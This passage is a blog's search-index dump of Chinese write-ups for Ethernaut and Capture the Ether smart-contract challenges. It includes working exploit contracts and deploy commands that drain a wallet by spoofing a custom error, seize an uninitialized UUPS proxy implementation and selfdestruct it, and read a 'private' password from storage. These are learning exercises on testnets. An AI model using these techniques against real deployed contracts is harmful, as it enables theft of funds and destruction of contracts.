chars) &#123; String charToHex = Integer.toHexString(c); sb.append(charToHex); &#125; int length = sb.length(); for (int i = 0; i &lt; 64 - length; i++) &#123; sb.append(0); &#125; System.out.println(&quot;0x&quot; + sb.toString()); &#125;&#125; 输入为 biyou 运行结果为： 以 0x6269796f75000000000000000000000000000000000000000000000000000000 为参数，调用 setNickname() 函数即可 3. 解题 3.1 部署 3.2 将转化好的数据以参数的形式传入 3.3","categories":[{"name":"Smart contracts","slug":"Smart-contracts","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/"},{"name":"capther the ether","slug":"Smart-contracts/capther-the-ether","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/capther-the-ether/"}],"tags":[{"name":"靶场","slug":"靶场","permalink":"https://biyouqiuqiu.com/tags/%E9%9D%B6%E5%9C%BA/"},{"name":"soliditiy","slug":"soliditiy","permalink":"https://biyouqiuqiu.com/tags/soliditiy/"}]},{"title":"Call me","slug":"Smart contracts/capther the ether/Call me","date":"2023-03-20T02:37:10.000Z","updated":"2023-03-20T02:37:10.000Z","comments":true,"path":"2023/03/20/Smart contracts/capther the ether/Call me/","link":"","permalink":"https://biyouqiuqiu.com/2023/03/20/Smart%20contracts/capther%20the%20ether/Call%20me/","excerpt":"","text":"Call me1. 题目 1.1 部署以下合约 1.2 调用命名的函数callme 12345678910// SPDX-License-Identifier: MITpragma solidity ^0.4.21;contract CallMeChallenge &#123; bool public isComplete = false; function callme() public &#123; isComplete = true; &#125;&#125; 2. 分析 2.1 部署，调用即可 3. 解题 3.1 3.2 调用 callme() 函数，再查看isComplete的值","categories":[{"name":"Smart contracts","slug":"Smart-contracts","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/"},{"name":"capther the ether","slug":"Smart-contracts/capther-the-ether","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/capther-the-ether/"}],"tags":[{"name":"靶场","slug":"靶场","permalink":"https://biyouqiuqiu.com/tags/%E9%9D%B6%E5%9C%BA/"},{"name":"soliditiy","slug":"soliditiy","permalink":"https://biyouqiuqiu.com/tags/soliditiy/"}]},{"title":"Deploy a contract","slug":"Smart contracts/capther the ether/Deploy a contract","date":"2023-03-20T02:33:10.000Z","updated":"2023-03-20T02:33:10.000Z","comments":true,"path":"2023/03/20/Smart contracts/capther the ether/Deploy a contract/","link":"","permalink":"https://biyouqiuqiu.com/2023/03/20/Smart%20contracts/capther%20the%20ether/Deploy%20a%20contract/","excerpt":"","text":"Deploy a contracttips： 宝藏博客1. 题目要求 1.1 To complete this challenge, you need to: Install MetaMask. Switch to the Ropsten test network. Get some Ropsten ether. Clicking the “buy” button in MetaMask will take you to a faucet that gives out free test ether. After you’ve done that, press the red button on the left to deploy the challenge contract. You don’t need to do anything with the contract once it’s deployed. Just click the “Check Solution” button to verify that you deployed successfully. 1.2 题目代码： 12345678pragma solidity ^0.4.21;contract DeployChallenge &#123; // This tells the CaptureTheFlag contract that the challenge is complete. function isComplete() public pure returns (bool) &#123; return true; &#125;&#125; 2. 分析 2.1 该题很简单，直接放到remix 上面部署就ok 了 3. 解题","categories":[{"name":"Smart contracts","slug":"Smart-contracts","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/"},{"name":"capther the ether","slug":"Smart-contracts/capther-the-ether","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/capther-the-ether/"}],"tags":[{"name":"靶场","slug":"靶场","permalink":"https://biyouqiuqiu.com/tags/%E9%9D%B6%E5%9C%BA/"},{"name":"soliditiy","slug":"soliditiy","permalink":"https://biyouqiuqiu.com/tags/soliditiy/"}]},{"title":"Gatekeeper Three","slug":"Smart contracts/ethernaut/Gatekeeper Three","date":"2023-03-13T06:33:10.000Z","updated":"2023-03-13T06:33:10.000Z","comments":true,"path":"2023/03/13/Smart contracts/ethernaut/Gatekeeper Three/","link":"","permalink":"https://biyouqiuqiu.com/2023/03/13/Smart%20contracts/ethernaut/Gatekeeper%20Three/","excerpt":"","text":"Gatekeeper Three1. 题目要求 1.1 应对大门并成为进入者。 可能有帮助的事情： 调用低级函数的返回值。 注意语义。 刷新存储在以太坊中的工作方式 1.2 题目代码： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract SimpleTrick &#123; GatekeeperThree public target; address public trick; uint private password = block.timestamp; constructor (address payable _target) &#123; target = GatekeeperThree(_target); &#125; function checkPassword(uint _password) public returns (bool) &#123; if (_password == password) &#123; return true; &#125; password = block.timestamp; return false; &#125; function trickInit() public &#123; trick = address(this); &#125; function trickyTrick() public &#123; if (address(this) == msg.sender &amp;&amp; address(this) != trick) &#123; target.getAllowance(password); &#125; &#125;&#125;contract GatekeeperThree &#123; address public owner; address public entrant; bool public allow_enterance = false; SimpleTrick public trick; function construct0r() public &#123; owner = msg.sender; &#125; modifier gateOne() &#123; require(msg.sender == owner); require(tx.origin != owner); _; &#125; modifier gateTwo() &#123; require(allow_enterance == true); _; &#125; modifier gateThree() &#123; if (address(this).balance &gt; 0.001 ether &amp;&amp; payable(owner).send(0.001 ether) == false) &#123; _; &#125; &#125; function getAllowance(uint _password) public &#123; if (trick.checkPassword(_password)) &#123; allow_enterance = true; &#125; &#125; function createTrick() public &#123; trick = new SimpleTrick(payable(address(this))); trick.trickInit(); &#125; function enter() public gateOne gateTwo gateThree returns (bool entered) &#123; entrant = tx.origin; return true; &#125; receive () external payable &#123;&#125;&#125; 2. 分析tips: 参考博客注意语义；这是一个巨大的赠品。首先想到的是旧版本Solidity 0.4.x中的一个老挑战，那里没有constructor关键字，相反，我们必须创建一个与合约同名的函数。 然而，我们现在已经进入了 0.8.18 时代；还有什么可能出错？我快速浏览了一下合同，立即注意到了一些奇怪的地方。快去看看；你注意到了吗？ 1function construct0r() public &#123;owner = msg.sender;&#125; 男孩，我知道这有问题，100%。但直到现在，我仍然不知道我要处理这份合同。 我会将我最初的想法记录为评论。并非所有这些都必须正确，但在阅读智能合约时记下是一个很好的做法。每当我处理一个新的代码库时，我都会使用类似Inline Bookmarks 的东西。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889*// SPDX-License-Identifier: MIT*pragma solidity ^0.8.0;contract SimpleTrick &#123; GatekeeperThree public target; address public trick;//maybe need a function to get the current timestamp? uint private password = block.timestamp; constructor (address payable _target) &#123; target = GatekeeperThree(_target); &#125; //first time running this will set the password as current timestamp? //although it is private, doens&#x27;t mean we cannot get the vaule back function checkPassword(uint _password) public returns (bool) &#123; if (_password == password) &#123; return true; &#125; password = block.timestamp; return false; &#125; //everyone can call this and it will set trick to the contract address function trickInit() public &#123; trick = address(this); &#125; //if the caller of frunction is this address and //this address is not trick, then it will call target.getAllowance(password) function trickyTrick() public &#123; if (address(this) == msg.sender &amp;&amp; address(this) != trick) &#123; target.getAllowance(password); &#125; &#125;&#125;contract GatekeeperThree &#123; address public owner; address public entrant; bool public allow_enterance = false; SimpleTrick public trick;//everyone can call this, so owner can be anyone function construct0r() public &#123; owner = msg.sender; &#125;//to pass we have to change the owner, but let the tx.origin be the contract? modifier gateOne() &#123; require(msg.sender == owner); require(tx.origin != owner); _; &#125;//straight forward stuff modifier gateTwo() &#123; require(allow_enterance == true); _; &#125;//this gate reuqire us to drain the address balance? not sure modifier gateThree() &#123; if (address(this).balance &gt; 0.001 ether &amp;&amp; payable(owner).send(0.001 ether) == false) &#123; _; &#125; &#125;//need to get the password to pass gate_two function getAllowance(uint _password) public &#123; if (trick.checkPassword(_password)) &#123; allow_enterance = true; &#125; &#125;//this function can create a new trick contract? using this contract addr as//constructor argument function createTrick() public &#123; trick = new SimpleTrick(payable(address(this))); trick.trickInit(); &#125;//pass all the gate function enter() public gateOne gateTwo gateThree returns (bool entered) &#123; entrant = tx.origin; return true; &#125; receive () external payable &#123;&#125;&#125; 所以基本上最终目标是调用enter()函数（可以是 EOA 或我们构建的智能合约……对吗？），它可以传递gateOne、gateTwo和gateThree修饰符。让我们仔细看看每个门： 1号门1234modifier gateOne() &#123; require(msg.sender == owner); require(tx.origin != owner); _; &#125; 让我们回顾一下tx.origin。 tx.origin是最初发起交易的地址，无论在此过程中进行了多少次合约调用。 msg.sender是当前函数的直接调用者的地址。 在调用链 A-&gt;B-&gt;C-&gt;D 中，在 D 内部，msg.sender将是 C，并且tx.origin将是 A。 满足此修饰符的一种方法是将另一个合约设置为所有者，而我们（一个 EOA）将成为tx.origin. 让我们抱着这个念头，看看能不能继续通过其他的门。 2号门1234567891011121314151617181920modifier gateTwo() &#123;require(allow_enterance == true);_;&#125;function getAllowance(uint _password) public &#123; if (trick.checkPassword(_password)) &#123; allow_enterance = true; &#125; &#125;//Simple Trick Contract: uint private password = block.timestamp;//................///function checkPassword(uint _password) public returns (bool) &#123; if (_password == password) &#123; return true; &#125; password = block.timestamp; return false; &#125; 如果我们可以输入正确的密码作为 的参数getAllowance()，这必须通过trick.checkPassword()函数，我们就可以破解门 2. 如何找到密码？我们需要一种方法来检查私有变量password。深入了解 Solidity Storage可能会有所帮助。 3号门123456modifier gateThree () &#123; if ( address ( this ).balance &gt; 0.001 ether &amp;&amp; payable (owner). send ( 0.001 ether) == false ) &#123; _; &#125; &#125; 这似乎是一个棘手的问题，因为我们必须满足两个条件： 当前合约的余额 ( address(this)) 必须大于 0.001 以太币。 向合约所有者（用 表示payable(owner)）发送 0.001 以太一定会失败（用 表示payable(owner).send(0.001 ether) == false）。 它证实了我的想法，即我们需要一个外部合约，因为我们可以某种方式revert()拒绝任何传入的 ETH。 高层行动计划如果您熟悉所有概念，这里是您可以遵循的行动计划。来吧，自己试试吧！ 用于createTrick()部署新的 SimpleTrick 合约 通过 web3js getStorageAt 函数取回密码 getAllowance(password)使用我们刚刚检索到的密码运行（gate 2 已解决） 发送 0.0011 以太币到实例合约地址（门 3 要求的一部分） 对于 gate1 和 gate3，我们需要创建一个合约来： 运行该construct0r()函数，使其成为所有者 创建一个函数，使其无法接收任何以太币 运行enter()函数 参赛者tx.origin现在应该是（我们的地址）。 一步一步的演练现在我们将逐步完成解决方案。首先，获取一个新实例。 获取新实例 您应该能够在控制台中看到一个实例地址。 获取您的实例地址 接下来，让我们去混音。在合同文件夹中创建一个文件，并将挑战中的所有代码粘贴到其中。你应该有这样的东西： 注意左边应该选择什么（先按左边的 ETH 标志）： 环境：我们需要使用 Injected Provider — MetaMask。 账户：选择加载了一些测试eth的账户（如果你评论你的地址，我会发给你一些）。 Contract : Gatekeeper Three 当然不是SimpleTrick。 这是诀窍： 如果您在蓝色按钮旁边输入合约地址At Address，您现在可以与已部署的合约进行交互。 （我以前觉得很神奇，但毕竟我们只需要3样东西就可以和EVM智能合约交互：ChainID，部署地址，合约&#x2F;ABI。） 这是按下At Address 按钮后您将看到的内容。接下来，我们可以使用createTrick 函数（橙色）来部署 SimpleTrick 合约的实例。 求解门 2由于trick（蓝色按钮）是一个公共变量，可以使用getter函数调用它。现在我们需要获取密码。如果您不知道 Solidity 中的存储是如何工作的，请谷歌。 在您的控制台中，运行以下行： 1await web3.eth.getStorageAt(“YOUR_SIMPLE_TRICK_ADDRESS”, 2, console.log) 您应该能够得到这样的十六进制数：0x00000000000000000000000000000000000000000000000000000000640bf3a8。 这将是密码。现在，回到 Remix，先打开 2 号门！ allow entry &#x3D; false 运行前getAllowance() getAllowance 使用我们从读取存储中获得的十六进制数运行该函数。请注意，allow_enterance在运行该函数之前，（错误的拼写）为假。运行“getAllowance”函数后，它将返回 true。 发送ETH解决50%门3对于 3 号门，我们必须向合约发送一小部分以太币，这样address(this).balance &gt; 0.001 ether才会成立。 在控制台中，我们可以使用这一行： 1234等待 web3.eth。sendTransaction ( &#123;from: player, to: “YOUR_INSTANCE_ADDRESS”, value: 10000000000000000 &#125; ) 对于“值”部分，虽然这不是最佳做法（因为输入那么多零通常会造成混淆），但我知道以太币是十进制的 18 位，因此加上 16 个零就是 0.01 以太币。 这不是你应该做的事情，但有时当你没有实用功能时（例如，与 Remix 或 Etherscan 上的合约交互），你只需要输入这些零。 当然，推荐的方式是这样的： 1await web3.eth.sendTransaction(&#123;from: player, to: “YOUR_INSTANCE_ADDRESS”, value: web3.utils.toWei(‘0.011’, ‘ether’)&#125;) 建筑解决方案合同我们还必须处理门 1 和门 3 的一部分。让我们总结需求并起草智能合约。它应该： 调用该construct0r()函数，使其成为 msg.sender。 有一个函数可以调用enter()函数，所以我们的地址可以变成tx.origin，msg.sender就是这个新合约。 该合约不应接收任何以太币。 这是我起草的一份小合同来处理所有这些问题。您不必按照我的方式进行（例如，尝试将函数放入solve()构造函数中，或将目标地址硬编码在其中）。 123456789101112131415161718合同解决方案&#123; GatekeeperThree公共目标； 地址公共所有者； 构造函数（地址_target）&#123; target = GatekeeperThree（payable（_target））; target.construct0r(); &#125; function solve () public returns ( bool entered ) &#123; entered = target.enter(); &#125; 接收 () 外部应付款 &#123; revert(); &#125; &#125; 您可以在混音的同一文件中将其作为合同键入。 在 Deploy 按钮顶部的合同框中，请记住选择合同解决方案。如果您按照我的指南操作，则还需要输入目标（GateKeeper 合约）地址。 最后，移动解决按钮并完成挑战！ 可以查看参赛者是否改成自己的地址： 返回 Ethernaut 并提交实例…… 做得好的消息总是令人满意。 3. 解题","categories":[{"name":"Smart contracts","slug":"Smart-contracts","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/"},{"name":"ethernaut","slug":"Smart-contracts/ethernaut","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/ethernaut/"}],"tags":[{"name":"Solidity","slug":"Solidity","permalink":"https://biyouqiuqiu.com/tags/Solidity/"},{"name":"靶场","slug":"靶场","permalink":"https://biyouqiuqiu.com/tags/%E9%9D%B6%E5%9C%BA/"}]},{"title":"Good Samaritan","slug":"Smart contracts/ethernaut/Good Samaritan","date":"2023-03-13T05:29:10.000Z","updated":"2023-03-13T05:29:10.000Z","comments":true,"path":"2023/03/13/Smart contracts/ethernaut/Good Samaritan/","link":"","permalink":"https://biyouqiuqiu.com/2023/03/13/Smart%20contracts/ethernaut/Good%20Samaritan/","excerpt":"","text":"Good Samaritan1. 题目要求 1.1 This instance represents a Good Samaritan that is wealthy and ready to donate some coins to anyone requesting it. Would you be able to drain all the balance from his Wallet? Things that might help: Solidity Custom Errors 1.2 题目代码： // SPDX-License-Identifier: MIT pragma solidity &gt;=0.8.0 &lt;0.9.0; import &quot;openzeppelin-contracts-08/utils/Address.sol&quot;; contract GoodSamaritan &#123; Wallet public wallet; Coin public coin; constructor() &#123; wallet = new Wallet(); coin = new Coin(address(wallet)); wallet.setCoin(coin); &#125; function requestDonation() external returns(bool enoughBalance)&#123; // donate 10 coins to requester try wallet.donate10(msg.sender) &#123; return true; &#125; catch (bytes memory err) &#123; if (keccak256(abi.encodeWithSignature(&quot;NotEnoughBalance()&quot;)) == keccak256(err)) &#123; // send the coins left wallet.transferRemainder(msg.sender); return false; &#125; &#125; &#125; &#125; contract Coin &#123; using Address for address; mapping(address =&gt; uint256) public balances; error InsufficientBalance(uint256 current, uint256 required); constructor(address wallet_) &#123; // one million coins for Good Samaritan initially balances[wallet_] = 10**6; &#125; function transfer(address dest_, uint256 amount_) external &#123; uint256 currentBalance = balances[msg.sender]; // transfer only occurs if balance is enough if(amount_ &lt;= currentBalance) &#123; balances[msg.sender] -= amount_; balances[dest_] += amount_; if(dest_.isContract()) &#123; // notify contract INotifyable(dest_).notify(amount_); &#125; &#125; else &#123; revert InsufficientBalance(currentBalance, amount_); &#125; &#125; &#125; contract Wallet &#123; // The owner of the wallet instance address public owner; Coin public coin; error OnlyOwner(); error NotEnoughBalance(); modifier onlyOwner() &#123; if(msg.sender != owner) &#123; revert OnlyOwner(); &#125; _; &#125; constructor() &#123; owner = msg.sender; &#125; function donate10(address dest_) external onlyOwner &#123; // check balance left if (coin.balances(address(this)) &lt; 10) &#123; revert NotEnoughBalance(); &#125; else &#123; // donate 10 coins coin.transfer(dest_, 10); &#125; &#125; function transferRemainder(address dest_) external onlyOwner &#123; // transfer balance left coin.transfer(dest_, coin.balances(address(this))); &#125; function setCoin(Coin coin_) external onlyOwner &#123; coin = coin_; &#125; &#125; interface INotifyable &#123; function notify(uint256 amount) external; &#125; 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061- ## 2. 分析#### tips: 参考博客在这个级别，有 3 个合同。`GoodSamaritan`是我们将与之交互的那个。`contract.abi`我们可以通过在控制台中执行来验证这一点。![图片.png](https://cdn.staticaly.com/gh/LBiyou/BlogImages@main/img/202306020024317.png)让我们看一下合同。### 钱包```soliditycontract Wallet &#123; // The owner of the wallet instance address public owner; Coin public coin; error OnlyOwner(); error NotEnoughBalance(); modifier onlyOwner() &#123; if(msg.sender != owner) &#123; revert OnlyOwner(); &#125; _; &#125; constructor() &#123; owner = msg.sender; &#125; function donate10(address dest_) external onlyOwner &#123; // check balance left if (coin.balances(address(this)) &lt; 10) &#123; revert NotEnoughBalance(); &#125; else &#123; // donate 10 coins coin.transfer(dest_, 10); &#125; &#125; function transferRemainder(address dest_) external onlyOwner &#123; // transfer balance left coin.transfer(dest_, coin.balances(address(this))); &#125; function setCoin(Coin coin_) external onlyOwner &#123; coin = coin_; &#125;&#125; 钱包在顶部定义了两个自定义错误，它在 revert 语句中使用。 该函数donate10()被调用以向请求者捐赠 10 个硬币。它在转账前检查合约余额 ( )，如果小于 10，则GoodSamaritan返回自定义错误 ( )。否则，它只转账 10 个硬币。NotEnoughBalance() 函数transferRemainder()将存储在合约中的所有硬币转移给请求者。我们需要以某种方式触发此功能。 上面描述的两个函数onlyOwner都只允许所有者调用它们。GoodSamaritan在这种情况下，业主将签订合同。 硬币1234567891011121314151617181920212223242526272829contract Coin &#123; using Address for address; mapping(address =&gt; uint256) public balances; error InsufficientBalance(uint256 current, uint256 required); constructor(address wallet_) &#123; // one million coins for Good Samaritan initially balances[wallet_] = 10**6; &#125; function transfer(address dest_, uint256 amount_) external &#123; uint256 currentBalance = balances[msg.sender]; // transfer only occurs if balance is enough if(amount_ &lt;= currentBalance) &#123; balances[msg.sender] -= amount_; balances[dest_] += amount_; if(dest_.isContract()) &#123; // notify contract INotifyable(dest_).notify(amount_); &#125; &#125; else &#123; revert InsufficientBalance(currentBalance, amount_); &#125; &#125;&#125; Coin 合约将一百万个硬币添加到GoodSamaritan构造函数内部的合约余额中。 这里的功能transfer很重要。它正在进行定期验证，减少发件人的金额并增加目的地的金额。但是有一个特别的验证是突出的 - if(dest_.isContract())。这是检查请求捐赠的地址是否是合约，并调用notify()地址上的函数，即dest_合约。由于我们控制了请求者地址，我们可以在该地址上创建一个合约，并可能在调用之后控制执行流程INotifyable(dest_).notify(amount_)。 GoodSamaritan123456789101112131415161718192021222324contract GoodSamaritan &#123; Wallet public wallet; Coin public coin; constructor() &#123; wallet = new Wallet(); coin = new Coin(address(wallet)); wallet.setCoin(coin); &#125; function requestDonation() external returns(bool enoughBalance)&#123; // donate 10 coins to requester try wallet.donate10(msg.sender) &#123; return true; &#125; catch (bytes memory err) &#123; if (keccak256(abi.encodeWithSignature(&quot;NotEnoughBalance()&quot;)) == keccak256(err)) &#123; // send the coins left wallet.transferRemainder(msg.sender); return false; &#125; &#125; &#125;&#125; 该合约正在部署Wallet和Coin合约的新实例。 这里的功能 1requestDonation() 很有趣。我们可以在外部调用这个函数。请注意，这整件事都在一个 1try and 1catch 块中。 该try块正在与调用该函数的任何人 wallet.donate10(msg.sender)一起执行调用。msg.sender 该catch块正在验证由于该块的错误而抛出的错误是否try与自定义错误消息的字符串相匹配NotEnoughBalance()。如果匹配，则钱包会将所有金额转移给我们。这就是我们需要实现的目标。 攻击流程让我们退后几步，跟踪调用该requestDonation()函数时发生了什么： 我们调用了requestDonation()，执行流程转到了wallet.donate10(msg.sender)。 coin.transfer()如果一切顺利，钱包合约就会调用。 该coin.transfer()函数进行必要的计算，检查我们的地址是否是一个合约，然后notify()在我们的地址上调用一个函数。 这是我们进攻的地方。我们notify()在我们的合约中创建一个函数，并让它恢复一个名为 的自定义错误NotEnoughBalance()。这将触发函数中的错误GoodSamaritan.requestDonation()，并且catch()将触发块向我们转移所有令牌。 但是等等，还有另一个问题。转移所有代币是行不通的，因为我们的合约只会恢复交易。为了解决这个问题，我们需要向我们的notify()函数添加另一个条件来检查是否amount &lt;= 10，然后只恢复。 利用下面是我们的漏洞利用代码的样子： 1234567891011121314151617181920// SPDX-License-Identifier: MITpragma solidity ^0.8.0;import &quot;../instances/Ilevel27.sol&quot;;contract BadSamaritan &#123; error NotEnoughBalance(); GoodSamaritan goodsamaritan = GoodSamaritan(0xcf2e93212faddDeB5ca99606104Be3Bae28e27A4); //ethernaut instance address function attax() external &#123; goodsamaritan.requestDonation(); &#125; function notify(uint256 amount) external pure &#123; if (amount &lt;= 10) &#123; revert NotEnoughBalance(); &#125; &#125;&#125; 该attax()函数仅用于调用requestDonation()以触发初始传输。 然后转账将调用我们的notify()函数，因为金额为 10，所以它会恢复。 然后，还原将触发区块catch并将requestDonation()所有代币转移给我们。 这次我们notify()不会因if条件而恢复。 让我们使用以下命令部署我们的合约： 1forge create BadSamaritan --private-key $PKEY --rpc-url $RPC_URL 现在调用attax()函数： 1cast send 0xb5daE871ADAFD33ee4B6Bf782a30b238902715F6 &quot;attax()&quot; --private-key $PKEY --rpc-url $RPC_URL --gas-limit 1000000 我指定了一个很大的 gas limit，因为交易一直失败。 现在可以提交实例以完成关卡。 3. 解题","categories":[{"name":"Smart contracts","slug":"Smart-contracts","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/"},{"name":"ethernaut","slug":"Smart-contracts/ethernaut","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/ethernaut/"}],"tags":[{"name":"Solidity","slug":"Solidity","permalink":"https://biyouqiuqiu.com/tags/Solidity/"},{"name":"靶场","slug":"靶场","permalink":"https://biyouqiuqiu.com/tags/%E9%9D%B6%E5%9C%BA/"}]},{"title":"Motorbike","slug":"Smart contracts/ethernaut/Motorbike","date":"2023-03-13T04:23:10.000Z","updated":"2023-03-13T04:23:10.000Z","comments":true,"path":"2023/03/13/Smart contracts/ethernaut/Motorbike/","link":"","permalink":"https://biyouqiuqiu.com/2023/03/13/Smart%20contracts/ethernaut/Motorbike/","excerpt":"","text":"Motorbike1. 题目要求 1.1 Ethernaut 的摩托车采用全新的可升级发动机设计。 你能启动selfdestruct它的引擎并使摩托车无法使用吗？ 可能有帮助的事情： EIP-1967 UUPS可升级模式 可初始化合约 1.2 题目代码： // SPDX-License-Identifier: MIT pragma solidity &lt;0.7.0; import &quot;openzeppelin-contracts-06/utils/Address.sol&quot;; import &quot;openzeppelin-contracts-06/proxy/Initializable.sol&quot;; contract Motorbike &#123; // keccak-256 hash of &quot;eip1967.proxy.implementation&quot; subtracted by 1 bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc; struct AddressSlot &#123; address value; &#125; // Initializes the upgradeable proxy with an initial implementation specified by `_logic`. constructor(address _logic) public &#123; require(Address.isContract(_logic), &quot;ERC1967: new implementation is not a contract&quot;); _getAddressSlot(_IMPLEMENTATION_SLOT).value = _logic; (bool success,) = _logic.delegatecall( abi.encodeWithSignature(&quot;initialize()&quot;) ); require(success, &quot;Call failed&quot;); &#125; // Delegates the current call to `implementation`. function _delegate(address implementation) internal virtual &#123; // solhint-disable-next-line no-inline-assembly assembly &#123; calldatacopy(0, 0, calldatasize()) let result := delegatecall(gas(), implementation, 0, calldatasize(), 0, 0) returndatacopy(0, 0, returndatasize()) switch result case 0 &#123; revert(0, returndatasize()) &#125; default &#123; return(0, returndatasize()) &#125; &#125; &#125; // Fallback function that delegates calls to the address returned by `_implementation()`. // Will run if no other function in the contract matches the call data fallback () external payable virtual &#123; _delegate(_getAddressSlot(_IMPLEMENTATION_SLOT).value); &#125; // Returns an `AddressSlot` with member `value` located at `slot`. function _getAddressSlot(bytes32 slot) internal pure returns (AddressSlot storage r) &#123; assembly &#123; r_slot := slot &#125; &#125; &#125; contract Engine is Initializable &#123; // keccak-256 hash of &quot;eip1967.proxy.implementation&quot; subtracted by 1 bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc; address public upgrader; uint256 public horsePower; struct AddressSlot &#123; address value; &#125; function initialize() external initializer &#123; horsePower = 1000; upgrader = msg.sender; &#125; // Upgrade the implementation of the proxy to `newImplementation` // subsequently execute the function call function upgradeToAndCall(address newImplementation, bytes memory data) external payable &#123; _authorizeUpgrade(); _upgradeToAndCall(newImplementation, data); &#125; // Restrict to upgrader role function _authorizeUpgrade() internal view &#123; require(msg.sender == upgrader, &quot;Can&#39;t upgrade&quot;); &#125; // Perform implementation upgrade with security checks for UUPS proxies, and additional setup call. function _upgradeToAndCall( address newImplementation, bytes memory data ) internal &#123; // Initial upgrade and setup call _setImplementation(newImplementation); if (data.length &gt; 0) &#123; (bool success,) = newImplementation.delegatecall(data); require(success, &quot;Call failed&quot;); &#125; &#125; // Stores a new address in the EIP1967 implementation slot. function _setImplementation(address newImplementation) private &#123; require(Address.isContract(newImplementation), &quot;ERC1967: new implementation is not a contract&quot;); AddressSlot storage r; assembly &#123; r_slot := _IMPLEMENTATION_SLOT &#125; r.value = newImplementation; &#125; &#125; 12345678910111213141516171819## 2. 分析此级别使用称为[UUPS](https://forum.openzeppelin.com/t/uups-proxies-tutorial-solidity-javascript/7786)（通用可升级代理标准）的代理模式。[我们在第 24 层](https://blog.dixitaditya.com/ethernaut-level-24-puzzle-wallet)看到的最后一个是透明代理模式。不同之处在于，在 UUPS 代理模式中，合约升级逻辑也将编码在执行合约中，而不是代理合约中。这允许用户节省一些气体。这是结构的样子：![图片.png](https://cdn.staticaly.com/gh/LBiyou/BlogImages@main/img/202306020024455.png)另一个区别是代理合约中定义了一个存储槽，用于存储逻辑合约的地址。每次升级逻辑合约时都会更新。这是为了防止存储冲突。有关更多信息，请参阅[EIP-1967](https://eips.ethereum.org/EIPS/eip-1967)。在我们的例子中，代理合约是摩托车，实现/逻辑合约是引擎。当我们查看代理合约时，我们可以看到存储槽定义为：复制```soliditybytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc; 该插槽存储执行合约的地址。 selfdestruct()当我们查看 Engine 合约时，我们可以看到合约代码中没有定义。那么我们将如何调用它呢？我们将尝试升级实施合约以将其指向我们已部署的攻击者合约。 为了升级逻辑，引擎合约定义了一个名为的函数upgradeToAndCall()： 复制 1234567function upgradeToAndCall(address newImplementation, bytes memory data) external payable &#123; _authorizeUpgrade(); _upgradeToAndCall(newImplementation, data);&#125;function _authorizeUpgrade() internal view &#123; require(msg.sender == upgrader, &quot;Can&#x27;t upgrade&quot;);&#125; 这是为了_authorizeUpgrade()检查是否msg.sender是upgrader. 因此，要升级合约，我们需要确保我们是upgrader. 那么我们如何成为升级者呢？我们来看一下函数initialize()： 复制 1234function initialize() external initializer &#123; horsePower = 1000; upgrader = msg.sender;&#125; initialize()是基于 UUPS 的合约中使用的特殊函数。并且，与initializer修饰符一起，它充当只能调用一次的构造函数。（这在修改器中检查initializer）。 这里应该注意的是，在此实现中，该initialize()函数应该由它正在执行的代理合约调用。你可以在它的构造函数中看到。但请记住，它是使用delegatecall(). 当调用者合约对另一个合约进行委托调用时，调用者合约的存储槽将使用逻辑合约的代码进行更新。 这意味着这delegatecall()是在代理合约的上下文中进行的，而不是在实现中进行的。 所以代理合约只能调用initialize()一次并且它会更新它的存储值是绝对正确的，但是如果我们要找到实施合约的部署地址并initialize()手动调用呢？在执行合同的上下文中，这还没有被调用。因此，如果我们要调用该函数，我们的用户 ( msg.sender) 将成为升级者。 一旦我们成为了，upgrader我们就可以调用upgradeToAndCall()我们自己的合约地址，我们可以在其中创建一个selfdestruct()函数。这应该足以解决水平。 利用让我们首先创建我们的攻击者合约，它将包含selfdestruct()函数： 复制 12345678// SPDX-License-Identifier: MITpragma solidity ^0.6.0;contract Destructive &#123; function killed() external &#123; selfdestruct(address(0)); &#125; &#125; selfdestruct()只是一个在外部函数中被调用的简单合同killed()。 这是我们的漏洞利用脚本的样子： 复制 123456789101112131415161718192021// SPDX-License-Identifier: MITpragma solidity ^0.6.0;import &quot;forge-std/Script.sol&quot;;import &quot;../instances/Ilevel25.sol&quot;;contract POC is Script &#123; Motorbike level25 = Motorbike(0xE7BaFbC26565E1047d1755B820Fa99Fb463a5BF4); Engine engineAddress = Engine(address(uint160(uint256(vm.load(address(level25), 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc))))); function run() external&#123; vm.startBroadcast(); engineAddress.initialize(); console.log(&quot;Upgrader is :&quot;, engineAddress.upgrader()); bytes memory encodedData = abi.encodeWithSignature(&quot;killed()&quot;); engineAddress.upgradeToAndCall(0x04dE0eA8556C85b94E61bC83B43d4FFb6DdC30F1, encodedData); vm.stopBroadcast(); &#125;&#125; Motorbike level25- 这是代理合约 Motorbike 的地址。 Engine engineAddress 123\\- 这包含引擎的地址，使用 vm.load(contract_address, slot_no) 123. 由于这会返回一个 bytes32 123值，地址是20个字节，所以我们需要将它转换为一个地址类型的变量。 address(uint160(uint256())) 12345这就是为什么要使用额外的。这也可以从控制台使用复制 await web3.eth.getStorageAt(contract.address, &#39;0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc&#39;) 123456789101112131415- `engineAddress.initialize()`- 我们正在调用该`initialize()`函数以成为升级程序。- `console.log`- 它只是用来通过将地址记录到控制台来确保我们成为升级者。- `bytes memory encodedData`- 